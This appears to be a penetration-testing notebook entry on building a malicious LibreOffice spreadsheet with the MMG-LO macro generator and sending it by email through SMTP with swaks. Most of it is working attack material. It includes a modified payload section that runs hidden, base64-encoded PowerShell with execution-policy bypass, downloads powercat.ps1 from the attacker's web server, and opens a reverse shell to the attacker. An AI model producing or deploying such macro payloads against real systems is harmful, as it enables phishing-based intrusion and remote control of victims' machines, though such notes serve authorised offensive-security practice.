we will download the following repo
```powershell
git clone https://github.com/0bfxgh0st/MMG-LO.git
```

command example 
```powershell
python3 mmg-ods.py windows <% tp.frontmatter["LHOST"] %> 1337
```
change `windows` to `linux` if your target is `linux` machine. 

send it using [04- SMTP(25)](../../03%20Exploitation%20&%20Lateral%20Movement/01%20Service%20Exploit/04-%20SMTP(25).md)

==in case that did not work try to the following ==
kali side 
```powershell
cp /usr/share/poshc2/resources/modules/powercat.ps1 .
```
start upload server 
```powershell
python3 -m http.server 80
```
you may also modify the script so that you get a powercat shell as following 
```powershell
subl MMG-LO/mmg-ods.py 
```
then replace the windows section as following 
```powershell
if sys.argv[1] == 'windows':  
  
vbacall = '''Set oShell = CreateObject("Wscript.Shell")  
oShell.Run'''  
build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://<% tp.frontmatter["LHOST"] %>/powercat.ps1");powercat -c {ip} -p {port} -e powershell')  
bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))  
base64payload = bytes_encoded.decode()  
payload = 'powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e ' + base64payload  
print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Payload: windows reverse shell")  
print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Creating malicious .ods file\n")  
Macro_Gen()
```


send it via email with [[swaks]] via [04- SMTP(25)](../../03%20Exploitation%20&%20Lateral%20Movement/01%20Service%20Exploit/04-%20SMTP(25).md) template command

